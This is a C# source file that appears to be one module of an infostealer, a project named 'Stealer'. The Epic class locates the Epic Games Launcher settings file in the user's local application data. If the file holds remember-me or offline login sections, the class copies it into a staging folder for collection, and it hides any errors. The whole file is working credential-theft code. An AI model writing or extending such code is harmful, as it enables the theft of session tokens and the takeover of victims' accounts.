using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Gaming;

internal class Epic
{
	public static void Start()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				if (text.Contains("[RememberMe]") || text.Contains("[Offline]"))
				{
					DynamicFiles.WriteAllText(Path.Combine("Gaming", "Epic", "GameUserSettings.ini"), text);
				}
			}
		}
		catch
		{
		}
	}
}
